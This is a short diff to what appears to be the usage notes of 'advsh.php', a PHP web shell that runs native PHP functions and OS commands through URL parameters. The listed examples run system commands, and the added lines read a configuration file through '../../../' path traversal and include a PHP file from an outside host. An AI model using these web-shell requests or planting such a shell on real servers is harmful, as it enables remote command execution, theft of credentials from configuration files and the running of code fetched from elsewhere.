@@ -16,6 +16,8 @@ Allow to use native PHP functions and OS commands.
 * advsh.php?f=system&p1=ipconfig
 * advsh.php?f=hash&y=teste&p1=sha256
 * advsh.php?f=copy&p1=teste.php&p2=teste.bkp
+* advsh.php?f=readfile&p1=../../../config.php
+* advsh.php?f=include&p1=https//www.brztec.com/file.php
 * and much more...
 
 
